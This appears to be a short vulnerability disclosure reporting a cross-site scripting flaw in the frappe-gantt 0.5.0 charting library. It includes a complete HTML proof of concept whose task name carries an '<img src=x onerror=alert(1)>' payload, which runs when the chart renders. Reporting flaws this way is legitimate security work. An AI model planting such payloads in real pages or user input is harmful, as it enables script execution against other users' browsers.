# Description

`frappe-gantt` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

Copy the below content and save it into a .html file and open in any browser XSS payload will get executed.
```
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Gantt</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/frappe-gantt/0.5.0/frappe-gantt.css" />
	<script src="https://cdnjs.cloudflare.com/ajax/libs/frappe-gantt/0.5.0/frappe-gantt.js"></script>
</head>
<body>
	<div class="container">
		<h2>Interactive Gantt Chart entirely made in SVG!</h2>
		<div class="gantt-target"></div>
	</div>
	<script>
		var tasks = [
			{
				start: '2018-10-01',
				end: '2018-10-08',
				name: 'Redesign website"<img src=x onerror=alert(1)>',
				id: "Task 0",
				progress: 20
			},
			{
				start: '2018-10-03',
				end: '2018-10-06',
				name: 'Write new content',
				id: "Task 1",
				progress: 5,
				dependencies: 'Task 0'
			}
		]
		var gantt_chart = new Gantt(".gantt-target", tasks, {
			on_click: function (task) {
				console.log(task);
			},
			on_date_change: function(task, start, end) {
				console.log(task, start, end);
			},
			on_progress_change: function(task, progress) {
				console.log(task, progress);
			},
			on_view_change: function(mode) {
				console.log(mode);
			},
			view_mode: 'Month',
			language: 'en'
		});
		console.log(gantt_chart);
	</script>
</body>
</html>
```
